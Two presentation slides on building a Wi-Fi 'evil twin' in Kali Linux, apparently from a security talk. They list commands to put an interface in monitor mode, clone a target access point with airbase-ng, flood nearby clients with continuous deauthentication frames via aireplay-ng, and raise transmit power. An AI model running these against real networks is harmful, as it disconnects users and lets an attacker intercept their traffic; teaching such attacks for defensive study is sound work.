# Evil Twin in Kali
- install bridge utils
```bash
apt-get install bridge-utils
```
- Start monitoring interface
```bash
airmon-ng start <interface>
    ```
- Create the evil twin
```bash
airbase-ng -a <BSSID here> --essid <ESSID here> -c <channel here> <interface name>
```

.footnote[Slides can be accessed through https://git.io/vNG5z]
---
# Evil Twin in Kali

- Deauthentication or Bumping Him Off
```bash
aireplay-ng --deauth 0 -a <BSSID> mon0 --ignore-negative-one
```
- Turn up the Power!
```bash
iwconfig <interface> twpower <power>
```

.note[before turning the power up check MAXIMUM WIFI TRANSMISSION POWER IN YOUR COUNTRY]
